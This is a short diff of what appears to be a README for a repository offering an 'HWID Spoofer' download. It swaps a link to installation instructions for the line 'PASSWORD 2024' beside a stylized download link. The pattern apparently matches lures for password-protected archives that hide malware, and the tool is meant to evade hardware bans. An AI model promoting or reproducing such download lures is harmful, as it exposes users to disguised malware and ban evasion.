@@ -3,7 +3,7 @@
 ##  [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
 
 
-# [Click here to view installation instructions](https://github.com/darkviceshot6/darkviceshot6/blob/main/Installation%20instructions.txt)
+#  PASSWORD 2024
 
 **HWID Spoofer Features with Download 💻🛡️**
 
